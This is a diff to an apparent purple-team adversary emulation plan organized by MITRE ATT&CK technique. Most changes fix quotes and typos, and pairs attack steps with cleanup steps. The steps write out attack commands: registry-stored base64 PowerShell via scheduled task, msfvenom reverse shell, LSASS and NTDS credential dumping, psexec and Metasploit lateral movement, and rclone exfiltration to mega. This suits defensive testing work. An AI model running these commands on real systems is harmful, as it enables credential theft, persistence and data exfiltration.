@@ -157,7 +157,7 @@ n/a
 
 <ins>Attack procedure</ins>
 1. Download files located at: https://github.com/Sam0x90/CTI/tree/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/S14_WMI
-2. Copy the script ""cmd_fileping.vbs"" in C:\temp\folder
+2. Copy the script "cmd_fileping.vbs" in C:\temp\folder
 3. Copy and run as admin the script wmi_event_sub.ps1
 4. Open a notepad.exe
 
@@ -169,12 +169,12 @@ The vbs script will then:
 
 <ins>Cleaning procedure</ins>
 1. Copy and run as admin the script wmi_sub_remove.ps1 to clean up the WMI subscription (binding, filter and consumer).
-2. Delete file ""cmd_fileping.vbs"" in C:\temp\folder
+2. Delete file "cmd_fileping.vbs" in C:\temp\folder
 
 ### Step 15 - Execution/Lateral Movement: T1047 Windows Management Instrumentation & T1021.006 Remote Services: Windows Remote Management
 
 <ins>Attack procedure</ins>
-1. ```wmic /node:<IP> process call create ""cmd.exe /c start C:\windows\system32\calc.exe""```
+1. ```wmic /node:<IP> process call create "cmd.exe /c start C:\windows\system32\calc.exe"```
 
 <ins>Cleaning procedure</ins>
 1. Kill calc.exe process on the targeted remote host
@@ -182,7 +182,7 @@ The vbs script will then:
 ### Step 16 - Persistence: T1053.005 Scheduled Task
 
 <ins>Attack procedure</ins>
-1. ```schtasks.exe /Create /F /TN ""{GUID}"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\thekey).xyz))) "" /SC MINUTE /MO 30```
+1. ```schtasks.exe /Create /F /TN "{GUID}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\thekey).xyz))) " /SC MINUTE /MO 30```
 
 <ins>Cleaning procedure</ins>
 1. Delete schedule task
@@ -190,12 +190,12 @@ The vbs script will then:
 ### Step 17 - Persistence: T1547.001 Registry Run Keys / Stratup Folder
 
 <ins>Attack procedure</ins>
-1. ```reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""PurpleCalc"" /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f```
-2. ```reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"" /v ""PurpleCalc"" /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f```
-3. ```reg add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""PurpleCalc"" /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f```
-4. ```reg add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce"" /v ""PurpleCalc"" /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f```
+1. ```reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```
+2. ```reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```
+3. ```reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```
+4. ```reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```
 5. ```reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "PurpleCalc" /t REG_EXPAND_SZ /d "C:\Windows\System32\calc.exe" /f```
-6. ```reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Run"" /v ""PurpleCalc"" /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f```
+6. ```reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Run" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f```
 
 <ins>Cleaning procedure</ins>
 1. Delete all created registry keys
@@ -224,14 +224,14 @@ Meterpreter is being used here but obviously those who can afford a CS license s
 
 <ins>Attack procedure</ins>
 
-Download athe following project: https://github.com/bmdyy/proc-hollow
-It requires, a WIndows machine with Visual Studio and second machine (preferrably a Kali Linux).
+Download the following project: https://github.com/bmdyy/proc-hollow
+It requires, a Windows machine with Visual Studio and second machine (preferrably a Kali Linux).
 
 1. Open the project in Visual Studio and modify the "CreateProcess" call with the process of your choice
 2. Use the following msfvenom command to generate a C# shellcode: ```msfvenom -p windows/x64/shell_reverse_tcp LPORT=4443 LHOST=<KALI_IP> -f csharp -v shellcode```
 3. Build
 4. Create a listener on Kali Linux with the following command: ```nc -nlvp 4443```
-3. Run the executable on the target Windows machine
+5. Run the executable on the target Windows machine
 
 <ins>Cleaning procedure</ins>
 
@@ -246,7 +246,7 @@ Because regsvr32 is used to register or unregister an OLE object, the DLL needs 
 1. Download this harmless DLL from RedCanary github: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll
 2. Execute: ```regsvr32.exe /s AllTheThingsx86.dll```
 
-This DLL was part of an open source project that no longer exists but the DLL is harmless and has been built to be loaded in various ways such as DllRegisterServer function. Upon execution the function DllRegisterServer will execute calc.exe. You should therefore see a calculator pops up on the screen. Alternatively you can remove the "/s" argument (silent) to get a confirmation (or error) message about the execution, though attackers usually use the "/s" argument to avoid tipping off potential user. 
+This DLL was part of an open source project that no longer exists but the DLL is harmless and has been built to be loaded in various ways such as with the DllRegisterServer function. Upon execution the function DllRegisterServer will execute calc.exe. You should therefore see a calculator pops up on the screen. Alternatively you can remove the "/s" argument (silent) to get a confirmation (or error) message about the execution, though attackers usually use the "/s" argument to avoid tipping off potential user. 
 
 <ins>Cleaning procedure</ins>
 1. Execute: ```regsvr32.exe /U /s AllTheThingsx86.dll```
@@ -255,13 +255,13 @@ This DLL was part of an open source project that no longer exists but the DLL is
 
 <ins>Attack procedure</ins>
 1. Calling export function name with arguments
-```rundll32 advpack.dll, RegisterOCX ""cmd.exe /c calc.exe""```
+```rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"```
 
 2. Calling export function by ordinal with arguments
-```rundll32 ""advpack.dll,#12"" ""cmd.exe /c calc.exe""```
+```rundll32 "advpack.dll,#12" "cmd.exe /c calc.exe"```
 
-3. Calling export function by negative ordinal number with args
-```rundll32 ""advpack.dll,#-4294967284"" ""cmd.exe /c calc.exe""```
+3. Calling export function by negative ordinal number with arguments
+```rundll32 "advpack.dll,#-4294967284" "cmd.exe /c calc.exe"```
 
 <ins>Cleaning procedure</ins>
 1. Kill the calc.exe processes created
@@ -269,7 +269,7 @@ This DLL was part of an open source project that no longer exists but the DLL is
 ### Step 22 - Credential Access: T1003.001 OS Credential Dumping: LSASS Memory & S0002 Mimikatz & S0349 Lazagne
 
 <ins>Attack procedure</ins>
-1. Dump LSASS Memory using comsvcs.dll by running the following command in an elevated command prompt:
+1. Dump LSASS memory using comsvcs.dll by running the following command in an elevated command prompt:
 1.1 ```rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\purple\lsass-comsvcs.dmp full```
 2. Download Mimikatz here: https://github.com/gentilkiwi/mimikatz/releases/latest and run the following in an elevated command prompt:
 ```
@@ -277,7 +277,7 @@ mimikatz.exe
 privilege::debug
 sekurlsa::logonpasswords
 ```
-3. Download ""Invoke-Mimikatz"" as m.ps1 and run the following in an elevated Powershell prompt:
+3. Download "Invoke-Mimikatz" as m.ps1 and run the following in an elevated Powershell prompt:
 ```
 Import-Module C:\Users\purple\m.ps1; Invoke-Mimikatz -ComputerName <COMPUTER_NAME>
 ```
@@ -297,7 +297,7 @@ ls.exe all -oN -output C:\Users\purple
 
 <ins>Attack procedure</ins>
 1. Dump NTDS with ntdsutil by running the following in a command prompt on DC:
-1.1 ```ntdsutil ""ac i ntds"" ""ifm"" ""create full dump_folder"" q q```
+1.1 ```ntdsutil "ac i ntds" "ifm" "create full dump_folder" q q```
 
 2. Dump NTDS using secretsdump.py downloaded at: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
 2.1 Normal execution using replication service
@@ -329,7 +329,7 @@ ping -n 1 <IP>
 nltest /dclist:
 nltest /domain_trusts
 nltest /domain_trust /all_trusts
-net group ""Domain Administrators"" /domain
+net group "Domain Administrators" /domain
 route print
 nslookup -querytype=ALL -timeout=10
 cmd /c set
@@ -366,7 +366,7 @@ n/a
 
 <ins>Attack procedure</ins>
 1. Download psexec from official source:  https://learn.microsoft.com/en-us/sysinternals/downloads/psexec and run the following command:
-```psexec.exe  \\<IP ADDRESS> -u <DOMAIN>\Administrator -p ""<PASSWORD>"" -s -d -h -r mstdc -accepteula -nobanner C:\windows\system32\calc.exe```
+```psexec.exe  \\<IP ADDRESS> -u <DOMAIN>\Administrator -p "<PASSWORD>" -s -d -h -r mstdc -accepteula -nobanner C:\windows\system32\calc.exe```
 
 <ins>Cleaning procedure</ins>
 1. Kill process on remote machine
@@ -381,12 +381,12 @@ Metasploit - PSexec module
 use exploit/windows/smb/psexec
 set RHOSTS <TARGET_IP>
 set SMBDomain <TARGET_DOMAIN>
-set SMBUser <TARGET_USER
+set SMBUser <TARGET_USER>
 set SMBPass <LMHASH>:<NTHASH>
 set SMBSHARE ADMIN$
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST <ATTACKING_IP>
-set LPORT <LISTENING_PORT
+set LPORT <LISTENING_PORT>
 exploit
 ```
 
@@ -424,17 +424,21 @@ Those tools usually have a free version but it requires to sign up with an accou
 ### Step 32 - Command and Control: T1071 Application Layer Protocol
 
 <ins>Attack procedure</ins>
+
+Flightsim a network traffic simulator that will generate DNS, DGA, C2 traffic.
+The tool will updated itself with recent IoC from alphasoc website API, so it might send TCP SYN towards recent malicious IPs. The risk to be assessed to determine if you want to test all outbound security layers or implement a "kill switch" at the last layer. 
+
 1. Download flightsim from: https://github.com/alphasoc/flightsim/releases
 2. Follow installation procedure depending on package downloaded.
 3. Run the following commands to simulate C2 traffic:
 ```
 flightsim run c2:trickbot
 flightsim run c2:bumblebee
-flightsim run ""c2:raccoon stealer""
-flightsim run ""c2:redline stealer""
-flightsim run ""c2:respberry robin""
-flightsim run ""c2:raccoon stealer""
-flightsim run ""c2:remcos rat""
+flightsim run "c2:raccoon stealer"
+flightsim run "c2:redline stealer"
+flightsim run "c2:respberry robin"
+flightsim run "c2:raccoon stealer"
+flightsim run "c2:remcos rat"
 ```
 
 Alternatively, run the following command to retrieve the list of all c2 families available for you to test:
@@ -447,7 +451,7 @@ n/a
 
 <ins>Attack procedure</ins>
 1. Download rclone from: https://rclone.org/downloads/ and run the following command:
-```rclone.exe copy ''\\<server>\<path>"" mega:folder -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6```
+```rclone.exe copy ''\\<server>\<path>'' mega:folder -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6```
 
 <ins>Cleaning procedure</ins>
 n/a
@@ -467,10 +471,3 @@ n/a
 
 <ins>Cleaning procedure</ins>
 n/a
-
-
-
-
-
-
-
